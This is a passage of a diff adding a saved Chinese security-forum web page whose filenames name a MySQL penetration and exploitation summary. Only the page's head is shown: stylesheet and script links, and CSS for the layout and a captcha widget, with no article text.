@@ -1,0 +1,1084 @@
+<!DOCTYPE html>
+<!-- saved from url=(0127)file:///home/kodachi/sq1map/sql%E6%B3%A8%E5%85%A5/%E5%85%88%E7%9F%A5%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA.html -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+
+    <title>先知安全技术社区</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <link rel="icon" href="https://xianzhi.aliyun.com/forum/static/icon/favicon.ico" type="image/x-icon">
+    <!-- Le styles -->
+    <link href="./Mysql数据库渗透及漏洞利用总结_files/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="./Mysql数据库渗透及漏洞利用总结_files/editormd.min.css">
+    <link rel="stylesheet" type="text/css" href="./Mysql数据库渗透及漏洞利用总结_files/topic.css">
+    <link rel="stylesheet" href="./Mysql数据库渗透及漏洞利用总结_files/tango.css">
+    <link rel="stylesheet" href="./Mysql数据库渗透及漏洞利用总结_files/OverlayStyle.css">
+    <link rel="stylesheet" href="./Mysql数据库渗透及漏洞利用总结_files/beautify.css">
+
+
+    <style>
+        body {
+            background-color: rgb(249, 249, 249);
+        }
+
+        form {
+            margin: 0 !important;
+        }
+
+        .box {
+            background-color: rgb(255, 255, 255);
+            -moz-border-radius: 3px;
+            border-radius: 3px;
+            -moz-box-shadow: 0 2px 5px rgba(0, 0, 0, 0.15);
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.15);
+            border-bottom: 2px solid #e2e2e9;
+            margin-top: 20px;
+        }
+
+        .box-container {
+            padding: 8px 8px 20px 8px;
+        }
+
+        .box ul, ol {
+            margin-bottom: 0 !important;
+        }
+
+        .footer {
+            min-height: 80px;
+            height: 50px;
+            padding-top: 88px;
+            text-align: left;
+            color: #999;
+            bottom: 50px;
+        }
+
+        .markdown-body ul {
+            list-style-type: disc;
+        }
+
+        .box a:hover {
+            text-decoration: none;
+        }
+
+        .container {
+            width: 68% !important;
+        }
+
+        .box-container > ul > li, .noti-list > ul > li {
+            list-style-type: none;
+        }
+
+        .brand-title {
+            color: #777;
+            display: inline-block;
+            vertical-align: middle;
+            position: relative;
+        }
+
+        .live-entry span:hover {
+            background-color: rgb(249, 249, 249);
+            color: #FA5555 !important;
+        }
+
+
+    </style>
+    <link href="./Mysql数据库渗透及漏洞利用总结_files/bootstrap-responsive.min.css" rel="stylesheet">
+
+
+    
+    <link rel="stylesheet" href="./Mysql数据库渗透及漏洞利用总结_files/editormd.css">
+    <link rel="stylesheet" href="./Mysql数据库渗透及漏洞利用总结_files/tango.css">
+    <link rel="stylesheet" href="./Mysql数据库渗透及漏洞利用总结_files/OverlayStyle.css">
+
+    <!--[if lte IE 8]>
+        <script src="http://code.jquery.com/jquery-1.11.3.min.js"></script>
+    <![endif]-->
+    <!--[if !IE]> -->
+    <script async="" src="./Mysql数据库渗透及漏洞利用总结_files/99.js" id="sd-collina-acjs"></script><script async="" src="./Mysql数据库渗透及漏洞利用总结_files/99(1).js" id="sd-collina-acjs"></script><script type="text/javascript" class="nc-required-js-1 nc-umid-script" src="./Mysql数据库渗透及漏洞利用总结_files/um.js"></script><script type="text/javascript" class="nc-required-js-1 nc-uab-script" src="./Mysql数据库渗透及漏洞利用总结_files/uac.js"></script><script type="text/javascript" src="./Mysql数据库渗透及漏洞利用总结_files/jquery-2.1.3.min.js"></script>
+    <!-- <![endif]-->
+    <script src="./Mysql数据库渗透及漏洞利用总结_files/utils.js"></script>
+    <script src="./Mysql数据库渗透及漏洞利用总结_files/getCookie.js"></script>
+    <script src="./Mysql数据库渗透及漏洞利用总结_files/bootstrap.min.js"></script>
+    
+    <script type="text/javascript" charset="utf-8" src="./Mysql数据库渗透及漏洞利用总结_files/nc.js"></script><style>@charset "utf-8";
+@font-face{font-family:'nc_iconfont';src:url("//at.alicdn.com/t/font_1465353706_4784257.eot");src:url("//at.alicdn.com/t/font_1465353706_4784257.eot?#iefix") format('embedded-opentype'),url("//at.alicdn.com/t/font_1465353706_4784257.woff") format('woff'),url("//at.alicdn.com/t/font_1465353706_4784257.ttf") format('truetype'),url("//at.alicdn.com/t/font_1465353706_4784257.svg#iconfont") format('svg')}@font-face{font-family:'ncpc_iconfont';src:url("//at.alicdn.com/t/font_384029_rhzpmteb25oecdi.eot");src:url("//at.alicdn.com/t/font_384029_rhzpmteb25oecdi.eot?#iefix") format('embedded-opentype'),url("//at.alicdn.com/t/font_384029_rhzpmteb25oecdi.woff") format('woff'),url("//at.alicdn.com/t/font_384029_rhzpmteb25oecdi.ttf") format('truetype'),url("//at.alicdn.com/t/font_384029_rhzpmteb25oecdi.svg#ncpc_iconfont") format('svg')}.nc-container div#nc-loading-circle{background:transparent;width:20px;height:20px;display:inline-block;position:relative;vertical-align:middle}.nc-container div#nc-loading-circle .sk-circle{background:transparent;width:100%;height:100%;position:absolute;left:0;top:0}.nc-container #nc-loading-circle .sk-circle:before{content:'';display:block;margin:0 auto;width:15%;height:15%;background-color:#818181;border-radius:100%;-webkit-animation:sk-circleFadeDelay 1.2s infinite ease-in-out both;animation:sk-circleFadeDelay 1.2s infinite ease-in-out both}.nc-container #nc-loading-circle .sk-circle2{-webkit-transform:rotate(30deg);-ms-transform:rotate(30deg);transform:rotate(30deg)}.nc-container #nc-loading-circle .sk-circle3{-webkit-transform:rotate(60deg);-ms-transform:rotate(60deg);transform:rotate(60deg)}.nc-container #nc-loading-circle .sk-circle4{-webkit-transform:rotate(90deg);-ms-transform:rotate(90deg);transform:rotate(90deg)}.nc-container #nc-loading-circle .sk-circle5{-webkit-transform:rotate(120deg);-ms-transform:rotate(120deg);transform:rotate(120deg)}.nc-container #nc-loading-circle .sk-circle6{-webkit-transform:rotate(150deg);-ms-transform:rotate(150deg);transform:rotate(150deg)}.nc-container #nc-loading-circle .sk-circle7{-webkit-transform:rotate(180deg);-ms-transform:rotate(180deg);transform:rotate(180deg)}.nc-container #nc-loading-circle .sk-circle8{-webkit-transform:rotate(210deg);-ms-transform:rotate(210deg);transform:rotate(210deg)}.nc-container #nc-loading-circle .sk-circle9{-webkit-transform:rotate(240deg);-ms-transform:rotate(240deg);transform:rotate(240deg)}.nc-container #nc-loading-circle .sk-circle10{-webkit-transform:rotate(270deg);-ms-transform:rotate(270deg);transform:rotate(270deg)}.nc-container #nc-loading-circle .sk-circle11{-webkit-transform:rotate(300deg);-ms-transform:rotate(300deg);transform:rotate(300deg)}.nc-container #nc-loading-circle .sk-circle12{-webkit-transform:rotate(330deg);-ms-transform:rotate(330deg);transform:rotate(330deg)}.nc-container #nc-loading-circle .sk-circle2:before{-webkit-animation-delay:-1.1s;animation-delay:-1.1s}.nc-container #nc-loading-circle .sk-circle3:before{-webkit-animation-delay:-1s;animation-delay:-1s}.nc-container #nc-loading-circle .sk-circle4:before{-webkit-animation-delay:-.9s;animation-delay:-.9s}.nc-container #nc-loading-circle .sk-circle5:before{-webkit-animation-delay:-.8s;animation-delay:-.8s}.nc-container #nc-loading-circle .sk-circle6:before{-webkit-animation-delay:-.7s;animation-delay:-.7s}.nc-container #nc-loading-circle .sk-circle7:before{-webkit-animation-delay:-.6s;animation-delay:-.6s}.nc-container #nc-loading-circle .sk-circle8:before{-webkit-animation-delay:-.5s;animation-delay:-.5s}.nc-container #nc-loading-circle .sk-circle9:before{-webkit-animation-delay:-.4s;animation-delay:-.4s}.nc-container #nc-loading-circle .sk-circle10:before{-webkit-animation-delay:-.3s;animation-delay:-.3s}.nc-container #nc-loading-circle .sk-circle11:before{-webkit-animation-delay:-.2s;animation-delay:-.2s}.nc-container #nc-loading-circle .sk-circle12:before{-webkit-animation-delay:-.1s;animation-delay:-.1s}@-webkit-keyframes sk-circleFadeDelay{0%,39%,100%{opacity:0}40%{opacity:1}}@-webkit-keyframes sk-circleFadeDelay{0%,39%,100%{opacity:0}40%{opacity:1}}@keyframes sk-circleFadeDelay{0%,39%,100%{opacity:0}40%{opacity:1}}.nc-container .scale_text2 #nc-loading-circle .sk-circle:before{background-color:#fff}.nc_iconfont{font-family:"nc_iconfont";color:#ff3f08;font-size:16px;font-style:normal}.ncpc_iconfont{font-family:"ncpc_iconfont";color:#ff3f08;font-size:16px;font-style:normal}.captcha-error .icon_ban{float:left;font-size:16px;padding-right:5px;line-height:14px}.clickCaptcha_text .btn_refresh{font-style:normal;cursor:pointer;background:#fff;color:#737383}.imgCaptcha .btn_refresh{font-size:20px;cursor:pointer;background:#fff;color:#737383}.nc_voice{display:none;position:relative;margin-top:-34px;z-index:99;width:auto;height:34px;background:#fff}.omeo-code-img,.omeo-code-audio{font-size:0;text-align:left}.omeo-code-audiobox,.omeo-code-img a,.omeo-code-audio a,.omeo-code-state{display:inline-block;*display:inline;zoom:1;height:32px;vertical-align:top;font-size:12px}.omeo-code .omeo-code-refresh{background:transparent;width:32px;height:32px;font-size:20px;color:#888;text-align:center;text-decoration:none;padding-left:4px;line-height:32px}.omeo-code .omeo-switch{display:none;width:32px;height:32px;border-left:1px solid #e1e1e1;background-image:url("//g.alicdn.com/sd/ncpc/images/checkcode.png");background-repeat:no-repeat}.omeo-img-active .omeo-code-img{display:block}.omeo-img-active .omeo-code-audio{display:none}.omeo-code-img img{border:1px solid #cdcdcd;cursor:pointer}.omeo-code-img .omeo-switch{background-position:9px -41px}.omeo-audio-active .omeo-code-audio{display:block}.omeo-audio-active .omeo-code-img{display:none}.omeo-code-refresh{position:relative;left:95px}.omeo-code-audiobox{position:relative;height:30px;line-height:32px;border:1px solid #e1e1e1;text-align:center;overflow:hidden;left:100px;top:1px;width:45%;min-width:80px;background-color:#eee}.omeo-code-audiobox a{display:block;text-decoration:none;color:#06c}.omeo-code-audiobox-playing a{visibility:hidden}.omeo-code-audiobox span,.omeo-code-audiobox b{visibility:hidden;position:absolute;top:0;left:0;height:30px;font-weight:100;overflow:hidden}.omeo-code-audiobox-playing span,.omeo-code-audiobox-playing b{visibility:visible}.omeo-code-audiobox span{z-index:0;width:0;background:#186bca}.omeo-code-audiobox b{width:100%;z-index:1;text-align:left;text-indent:30px;color:#999;background:url("//g.alicdn.com/sd/ncpc/images/checkcode.png") no-repeat 14px -89px}.omeo-code-audio .omeo-switch{background-position:5px 10px}input[type=text]::-ms-clear{display:none}.omeo-box{position:relative;background-color:#fff}.omeo-code-echo{position:absolute;top:2px;left:2px}.omeo-code-echo input{padding:5px;height:18px;line-height:18px;border:1px solid #ddd;width:80px;outline:0}.omeo-code-state{height:30px;line-height:30px;text-indent:25px;white-space:nowrap;background-image:url("//g.alicdn.com/sd/ncpc/images/checkcode.png");background-repeat:no-repeat;background-position:100px 100px}.omeo-code-echo .omeo-code-state-error{width:auto;background-position:7px -193px}.omeo-code-echo .omeo-code-state-success{position:absolute;width:30px;background-position:7px -243px}.omeo-code-state{position:absolute;left:0;top:28px}.nc_voice_close{display:inline-block;position:relative;cursor:pointer;left:95px;top:0;border-left:#ddd 2px solid;padding:0 0 0 7px;background-color:#fff;font-size:20px;color:#888;line-height:32px}.nc_help{position:absolute;width:100%;height:100%;left:0;top:0;z-index:99999}.nc_help .mask{background-color:#000;opacity:.5;filter:alpha(opacity=50);width:100%;height:100%;top:0;left:0}.nc_btn_close{position:absolute;height:20px;left:500px;border-radius:20px;padding:10px 30px;background-color:#aaa;color:#fff;cursor:pointer;z-index:10}.nc_btn_close:hover{background-color:#afafaf}.nc_hand{position:absolute;width:68px;height:53px;background-image:url("//g.alicdn.com/sd/ncpc/images/hand.png");z-index:3}.nc_slide_bg{z-index:3;font-size:12px;text-align:center;color:#fff;line-height:34px}.nc_voicebtn{position:absolute;padding:0;right:-25px;font-size:23px;color:#888;cursor:pointer;line-height:34px}.nc_helpbtn{position:absolute;cursor:pointer;right:-95px;top:4px;font-size:12px;background-color:#ffb668;color:#fff;padding:4px;border-radius:2px;line-height:18px;display:none}.nc_helpbtn:before{width:0;height:0;content:"";position:absolute;left:-2px;top:6px;border-top:4px solid transparent;border-bottom:4px solid transparent;border-right:4px solid #ffb668}.nc-container .errloading{border:#faf1d5 1px solid;text-indent:3px;background-image:none;font-size:12px;width:290px;line-height:20px;padding:7px 5px 8px 5px;color:#ef9f06;}.nc-container .errloading a{color:#30a7fc}.nc_captcha_text .nc_err{float:left;text-indent:0}.button_move{transition:left .5s;-moz-transition:left .5s;-webkit-transition:left .5s;-o-transition:left .5s}.bg_move{transition:width .5s;-moz-transition:width .5s;-webkit-transition:width .5s;-o-transition:width .5s}.nc_slide_box{position:absolute}.nc_captcha_text{height:auto;line-height:20px;visibility:hidden;font-size:12px;color:#999;font-weight:normal}.nc-container .nc_captcha_img_text{width:auto;height:auto;line-height:20px;visibility:hidden;font-size:12px;color:#999;font-weight:normal;display:none;padding:0 0 10px 0;background-position:0 0;}.nc-container .nc_captcha_img_text span.nc-lang-cnt{line-height:inherit}.nc-container .imgCaptcha .nc_captcha_img_text{width:auto}.nc_captcha_img_text{height:auto;line-height:20px;visibility:hidden;font-size:12px;color:#999;font-weight:normal;display:none;padding:0 0 10px 3px;background-position:0 0}.nc-container .nc_wrapper{width:auto}.nc_scale{width:auto;height:34px;background:#e8e8e8;position:relative;margin:0;padding:0}.nc_scale.is_audio{margin-right:25px}.nc-container .nc_scale div{height:auto}.nc-container .nc_scale ul{list-style:none}.nc-container .nc_scale .btn_slide{color:#737383;background-image:none;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.nc-container .nc_scale span{text-align:center;width:40px;height:32px;line-height:32px;border:1px solid #ccc;position:absolute;left:0;cursor:move;background:#fff;z-index:2}.nc-container .nc_scale span.nc-lang-cnt{*line-height:34px;float:none;width:auto;height:auto;*height:34px;border:none;position:static;cursor:inherit;background:none;z-index:0;display:inline}.nc_slide_button{width:40px;height:32px;border:1px solid #ccc;position:absolute;left:0;cursor:move;background:#fff url("//g.alicdn.com/sd/ncpc/images/rt.png") no-repeat center;z-index:2}@media screen and (-ms-high-contrast:active),(-ms-high-contrast:none){.nc_scale span{height:32px}}.nc-container .nc_scale .btnok{cursor:default;background:#fff url("//g.alicdn.com/sd/ncpc/images/yes.png") no-repeat center;z-index:3}.nc-container .nc_scale .btnok2{cursor:default;font-size:20px;background:#fff url("//g.alicdn.com/sd/ncpc/images/no.png") no-repeat center;z-index:3}.nc-container .nc_scale .btn_warn{cursor:default;color:#ff3f08;line-height:34px;text-align:center;font-size:20px;background:#fff;z-index:3}.nc-container .clickCaptcha_text .btn_refresh{font-size:20px}.nc-container .clickCaptcha_text .icon_close{line-height:30px;margin-left:8px;cursor:default;color:#ff3f08;font-size:16px;float:left;margin-right:2px;background:transparent;z-index:3}.nc-container .nc_captcha_img_text .icon_close{cursor:default;color:#ff3f08;font-size:16px;float:left;margin-right:4px;background:transparent;z-index:3;line-height:18px}.nc-container .errloading .icon_warn{cursor:default;color:#ff3f08;font-size:18px;float:left;background:transparent;z-index:3}.nc-container .nc_scale .btn_ok{cursor:default;line-height:34px;text-align:center;font-size:20px;background:#fff;z-index:3;color:#76c61d}.nc-container .nc_scale .nc_ok,.nc-container .nc_scale .nc_bg{background:#7ac23c}.nc-container .nc_scale .nc_bg{position:absolute;height:100%;_height:34px;left:0;width:10px}.nc-container .nc_scale div.redbar{background:#fc461e;opacity:.5;filter:alpha(opacity=50)}.nc-container .nc_scale div.orange{background:#f00}.nc-container .nc_scale .scale_text{width:100%;height:100%;text-align:center;position:absolute;z-index:1;background:transparent;color:#9c9c9c;line-height:34px;font-size:12px;cursor:pointer}.nc-container .nc_scale .scale_text2{text-align:left;color:#fff;font-size:12px;text-indent:10px}.nc-container .nc_scale .scale_text2 b{padding-left:0;font-weight:normal}.nc-container .nc_scale .scale_text.scale_loading_text{text-align:center}.nc-container .nc_scale .imgCaptcha,.nc-container .nc_scale .clickCaptcha{display:none;overflow:hidden;border:1px solid #ccc;background:#fff;z-index:20000;}.nc-container .nc_scale .imgCaptcha p.error span,.nc-container .nc_scale .clickCaptcha p.error span{line-height:normal}.nc-container .nc_scale .imgCaptcha{height:auto}.nc-container .nc_scale .clickCaptcha{position:absolute;left:0;top:35px;height:270px;background:#fff;display:none;}.nc-container .nc_scale .clickCaptcha p.error i{color:#ff3f08;font-style:normal}.nc-container .nc_scale .clickCaptcha div{position:static;clear:both;width:100%;background:#fff;height:auto}.nc-container .nc_scale .clickCaptcha .clickCaptcha_text{height:30px;line-height:30px;font-size:12px;color:#999;}.nc-container .nc_scale .clickCaptcha .clickCaptcha_text b{font-weight:normal}.nc_btn_2{position:absolute;right:0;top:0;cursor:pointer;margin:2px 9px 0 0}.nc_iconfont.nc_btn_2{position:absolute;right:0;top:0;cursor:pointer}.nc_iconfont.nc_btn_1{position:absolute;top:10px;right:5px}.nc_btn_1{top:10px;right:10px}.scale_text i{font-style:normal;border:none;position:static;cursor:default;color:#fffc00;background:none;display:inline;width:100%}.nc-container .clickCaptcha .clickCaptcha_img{margin:0 auto;clear:both;position:relative;}.nc-container .clickCaptcha .clickCaptcha_img img{width:230px;height:230px;margin-left:10px;margin-top:5px}.nc-container .clickCaptcha .clickCaptcha_btn{margin:10px 0 0 15px;position:relative;text-align:left;}.nc-container .clickCaptcha .clickCaptcha_btn img{cursor:pointer}.nc-container .imgCaptcha{position:absolute;left:0;top:35px;height:auto;padding-bottom:15px;border:1px solid #ccc;background:#fff;}.nc-container .imgCaptcha div{position:static;width:90%;background-color:#fff}.nc-container .imgCaptcha,.nc-container .clickCaptcha{text-align:left;}.nc-container .imgCaptcha a,.nc-container .clickCaptcha a{color:#ff3f08}.nc-container .imgCaptcha .imgCaptcha_text{height:42px;line-height:42px;width:120px;background:#fff;font-size:14px;text-align:left;color:#747474;float:left;margin-left:10px;}.nc-container .imgCaptcha .imgCaptcha_text input{margin-top:5px;height:30px;line-height:30px;font-size:14px;width:90px;background:#fff}.nc-container .imgCaptcha .imgCaptcha_text input:focus{outline:none;color:#bbb}.nc-container .imgCaptcha .imgCaptcha_btn{margin:0 0 0 12px;*margin-left:0;clear:both;padding-top:5px;width:90%;}.nc-container .imgCaptcha .imgCaptcha_btn img{cursor:pointer}.nc-container .imgCaptcha .nc_scale_submit{margin:0 auto;cursor:pointer;background-color:#fc461e;width:120px;height:32px;line-height:32px;color:#fff;text-align:center}.nc-container .imgCaptcha .imgCaptcha_img{margin:4px 0 0 100px;height:40px;width:130px;overflow:hidden;cursor:pointer;}.nc-container .imgCaptcha .imgCaptcha_img img{width:130px}.nc-container .imgCaptcha .imgCaptcha_img input{border:solid 1px #ccc}.nc-lang-ar_MA,.nc-lang-ar_SA,.nc-lang-iw_HE,.nc-lang-iw_IL{text-align:right;*text-align:left;}.nc-lang-ar_MA .nc_scale .scale_text2,.nc-lang-ar_SA .nc_scale .scale_text2,.nc-lang-iw_HE .nc_scale .scale_text2,.nc-lang-iw_IL .nc_scale .scale_text2{text-align:right;}.nc-lang-ar_MA .nc_scale .scale_text2 span,.nc-lang-ar_SA .nc_scale .scale_text2 span,.nc-lang-iw_HE .nc_scale .scale_text2 span,.nc-lang-iw_IL .nc_scale .scale_text2 span{*display:inline-block;padding:0 56px 0 0}.nc-lang-ar_MA .nc_captcha_img_text,.nc-lang-ar_SA .nc_captcha_img_text,.nc-lang-iw_HE .nc_captcha_img_text,.nc-lang-iw_IL .nc_captcha_img_text{*text-align:right}.nc-lang-ar_MA span.nc-lang-cnt,.nc-lang-ar_SA span.nc-lang-cnt,.nc-lang-iw_HE span.nc-lang-cnt,.nc-lang-iw_IL span.nc-lang-cnt{text-align:right;direction:rtl}.nocaptcha span.nc-lang-cnt{float:none;height:auto;line-height:30px}.nc-container{font-size:12px;-ms-touch-action:none;touch-action:none;}.nc-container p{margin:0;padding:0;display:inline}.nc-container .scale_text.scale_text span[data-nc-lang="_startTEXT"]{display:inline-block;width:100%}.nc-container .scale_text.scale_text.slidetounlock span[data-nc-lang="_startTEXT"]{background:-webkit-gradient(linear,left top,right top,color-stop(0,#4d4d4d),color-stop(.4,#4d4d4d),color-stop(.5,#fff),color-stop(.6,#4d4d4d),color-stop(1,#4d4d4d));-webkit-background-clip:text;-webkit-text-fill-color:transparent;-webkit-animation:slidetounlock 3s infinite;-webkit-text-size-adjust:none}.nc-container .nc_scale .nc-align-center.scale_text2{text-align:center;text-indent:-42px}@-webkit-keyframes slidetounlock{0%{background-position:-200px 0}100%{background-position:200px 0}}.nc-container.tb-login .clickCaptcha_text .icon_close{line-height:30px;margin-left:0;cursor:default;color:#ff3f08;font-size:16px;float:left;margin-right:0;background:transparent;z-index:3}.nc-container.tb-login{position:relative;margin-top:20px;display:none;}.nc-container.tb-login .nc_scale{width:auto;}.nc-container.tb-login .nc_scale .scale_text2{text-indent:-42px;text-align:center;}.nc-container.tb-login .nc_scale .scale_text2 b{padding:0}.nc-container.tb-login .nc_scale.nc_err div.scale_text{background:#f79977}.nc-container.tb-login .errloading{width:auto}.nc-container.tb-login .imgCaptcha,.nc-container.tb-login .clickCaptcha{width:252px;*width:256px;border:0;*height:300px;min-height:300px;max-height:inherit !important;}.nc-container.tb-login .imgCaptcha div.login-msg.error,.nc-container.tb-login .clickCaptcha div.login-msg.error{background:#fff2f2}.nc-container.tb-login .imgCaptcha .captcha-error,.nc-container.tb-login .clickCaptcha .captcha-error{position:absolute;top:0;width:244px;height:auto;margin-bottom:15px;padding:3px;border:solid 1px #ff8e8e;line-height:18px}.nc-container.tb-login .imgCaptcha .captcha-inform,.nc-container.tb-login .clickCaptcha .captcha-inform{font-size:110%;margin-left:20px}.nc-container.tb-login .imgCaptcha{padding-top:66px;}.nc-container.tb-login .imgCaptcha .imgCaptcha_text{width:100px;margin-left:0;}.nc-container.tb-login .imgCaptcha .imgCaptcha_text input:focus{color:#000}.nc-container.tb-login .imgCaptcha .imgCaptcha_img{width:120px;_width:100px}.nc-container.tb-login .imgCaptcha .imgCaptcha_btn{width:100%;margin-left:0}.nc-container.tb-login .imgCaptcha .nc_scale_submit{width:100%;height:36px;line-height:36px;margin-top:20px;margin-left:0;border-radius:3px;font-size:16px;font-family:Tahoma,Helvetica,Arial,sans-serif;background:#ff3f08}.nc-container.tb-login .clickCaptcha{padding-top:40px;}.nc-container.tb-login .clickCaptcha .clickCaptcha_text{text-indent:4px}.nc-container.tb-login .clickCaptcha .clickCaptcha_img img{margin-left:10px}.nc-container.tb-login .nc_btn_1{top:77px;_top:57px}.nc-container.tb-login .nc_btn_2{top:36px}.login .nc-container.tb-login .login-msg p,.login-box .nc-container.tb-login .login-msg p{width:auto;float:left}.nc-container.tb-login.nc-old-login{margin:20px 0 10px 0;width:250px;}.nc-container.tb-login.nc-old-login .nc_wrapper{width:250px}.nc-container.tb-login.nc-old-login .imgCaptcha,.nc-container.tb-login.nc-old-login .clickCaptcha{width:250px;min-height:auto;}.nc-container.tb-login.nc-old-login .imgCaptcha .captcha-error,.nc-container.tb-login.nc-old-login .clickCaptcha .captcha-error{line-height:16px}.nc-container.tb-login.nc-old-login .clickCaptcha{padding-top:28px;}.nc-container.tb-login.nc-old-login .clickCaptcha .clickCaptcha_img img{width:200px;height:200px}.nc-container.nc-old-login.show-click-captcha{padding-bottom:60px}.nc-container.nc-old-login.show-click-captcha.nc-tm-min-fix{padding-bottom:40px}.nc-container.tb-login.nc-tm-min-fix .clickCaptcha{max-height:340px !important}#content .login-box .bd .nc-container.tb-login .login-msg{margin:10px auto 15px auto}#content .login-box .bd .nc-container.tb-login.nc-old-login.show-click-captcha .login-msg{margin:2px 0 0 0}.nc-container .nc_scale .nc-cc{display:none;position:absolute;left:0;top:35px;z-index:20000;width:360px;height:570px;border:1px solid #5eaef1;border-radius:4px;background:#fff;font-size:14px;line-height:18px;color:#333;}.nc-container .nc_scale .nc-cc.nc-cc-status-loading .nc-cc-btn,.nc-container .nc_scale .nc-cc.nc-cc-status-verifing .nc-cc-btn{background-color:#90c1eb}.nc-container .nc_scale .nc-cc.nc-cc-status-loading .nc-cc-btn,.nc-container .nc_scale .nc-cc.nc-cc-status-verifing .nc-cc-btn,.nc-container .nc_scale .nc-cc.nc-cc-status-loading .nc-cc-refresh,.nc-container .nc_scale .nc-cc.nc-cc-status-verifing .nc-cc-refresh{cursor:default}.nc-container .nc_scale .nc-cc.nc-cc-status-loading .nc-cc-refresh,.nc-container .nc_scale .nc-cc.nc-cc-status-verifing .nc-cc-refresh{color:#999}.nc-container .nc_scale .nc-cc a{color:#3199f4;text-decoration:none}.nc-container .nc_scale .nc-cc .nc_iconfont{vertical-align:top;margin-right:8px}.nc-container .nc_scale .nc-cc-btn{display:inline-block;*display:inline;*zoom:1;vertical-align:top;letter-spacing:normal;word-spacing:normal;width:100px;line-height:30px;text-align:center;background-color:#3199f4;color:#fff;border-radius:4px;cursor:pointer;}.nc-container .nc_scale .nc-cc-btn.nc-cc-disabled{background-color:#90c1eb;cursor:default}.nc-container .nc_scale .nc-cc-btn .nc-lang-cnt{line-height:18px}.nc-container .nc_scale .nc-cc-header{padding:20px 20px 19px 20px;height:100px;background:#f4f8fa;border-bottom:1px solid #ccc}.nc-container .nc_scale .nc-cc-img1-box{float:left;width:100px;height:100px;margin-right:16px}.nc-container .nc_scale .nc-cc-txt{overflow:hidden;*zoom:1;line-height:30px;padding-top:11px}.nc-container .nc_scale .nc-cc-img2-box{position:relative;padding:0 20px;margin-top:20px}.nc-container .nc_scale .nc-cc-items{position:absolute;left:20px;_left:0;top:0;width:320px;overflow:hidden}.nc-container .nc_scale .nc-cc-items-inner{margin-right:-20px}.nc-container .nc_scale .nc-cc-item{position:relative;display:inline-block;*display:inline;*zoom:1;vertical-align:top;letter-spacing:normal;word-spacing:normal;margin-right:10px;margin-bottom:10px;border:1px solid #ccc;width:98px;height:98px;background:url("//gtms02.alicdn.com/tps/i2/T1ty2QFNNXXXc6Yc2r-1-1.gif");}.nc-container .nc_scale .nc-cc-item:hover{border-color:#3199f4}.nc-container .nc_scale .nc-cc-item .nc_iconfont{display:none;position:absolute;right:0;bottom:0;color:#3199f4;font-size:22px;margin-right:0}.nc-container .nc_scale .nc-cc-item.nc-cc-selected .nc_iconfont{display:block}.nc-container .nc_scale .nc-cc-tip{display:none;position:absolute;left:0;bottom:60px;width:360px;line-height:18px;text-align:center;color:#eb4f38;}.nc-container .nc_scale .nc-cc-tip span{line-height:normal}.nc-container .nc_scale .nc-cc-footer{position:absolute;left:0;bottom:20px;width:360px;height:30px;line-height:30px;text-align:center;}.nc-container .nc_scale .nc-cc-footer .nc_iconfont{color:#c4cbd0}.nc-container .nc_scale .nc-cc-refresh,.nc-container .nc_scale .nc-cc-wait{position:absolute;left:20px;top:0;color:#3199f4;cursor:pointer}.nc-container .nc_scale .nc-cc-wait{display:none}.nc-container .nc_scale .nc-cc-cancel{position:absolute;right:20px;top:0;color:#3199f4;cursor:pointer;}.nc-container .nc_scale .nc-cc-cancel .nc_iconfont{position:relative;top:-1px}.nc-container .nc_scale .nc-cc-loading{margin-top:247px;text-align:center;line-height:14px}.nc-container .nc_scale .nc-cc-loading-img{display:inline-block;*display:inline;*zoom:1;vertical-align:top;letter-spacing:normal;word-spacing:normal;vertical-align:middle;background:url("//img.alicdn.com/tps/TB1OdxsKpXXXXcgXFXXXXXXXXXX-14-14.gif") no-repeat;width:14px;height:14px;position:relative;top:-1px;margin-right:9px}.nc-container .nc_scale .nc-cc-fail{position:absolute;left:50%;top:50%;width:320px;height:180px;margin-left:-160px;margin-top:-90px;background:#fff;border-radius:4px}.nc-container .nc_scale .nc-cc-fail-inner{text-align:center;padding:55px 10px 10px}.nc-container .nc_scale .nc-cc-fail-action{margin:28px 0 18px;}.nc-container .nc_scale .nc-cc-fail-action a{display:inline-block;*display:inline;*zoom:1;vertical-align:top;letter-spacing:normal;word-spacing:normal;line-height:30px;margin-left:16px}.nc-container .nc_scale .nc-cc-contact{text-align:right;color:#666;padding-right:9px}.nc-container .nc_scale .nc-cc-mask{display:none;position:absolute;left:0;top:0;width:360px;height:570px;background:rgba(0,0,0,0.3);filter:progid:DXImageTransform.Microsoft.gradient(enabled='true',startColorstr='#4C000000', endColorstr='#4C000000');}:root .nc-container .nc_scale .nc-cc-mask{-webkit-filter:none;filter:none}.nc-container .nc_scale .nc-cc-arrow-1,.nc-container .nc_scale .nc-cc-arrow-2{display:none;position:absolute;top:340px;border:solid transparent;height:0;width:0}.nc-container .nc_scale .nc-cc-arrow-1{border-width:16px;margin-top:-1px}.nc-container .nc_scale .nc-cc-arrow-2{border-width:15px}.nc-container .nc_scale .nc-cc-right .nc-cc-arrow-1,.nc-container .nc_scale .nc-cc-left .nc-cc-arrow-1,.nc-container .nc_scale .nc-cc-right .nc-cc-arrow-2,.nc-container .nc_scale .nc-cc-left .nc-cc-arrow-2{display:block;_display:none}.nc-container .nc_scale .nc-cc-right{left:180px;top:-339px;}.nc-container .nc_scale .nc-cc-right .nc-cc-arrow-1{border-right-color:#5eaef1;left:-32px}.nc-container .nc_scale .nc-cc-right .nc-cc-arrow-2{border-right-color:#fff;left:-30px}.nc-container .nc_scale .nc-cc-left{left:-335px;top:-339px;}.nc-container .nc_scale .nc-cc-left .nc-cc-arrow-1{border-left-color:#5eaef1;right:-32px}.nc-container .nc_scale .nc-cc-left .nc-cc-arrow-2{border-left-color:#fff;right:-30px}</style><style>@charset "utf-8";
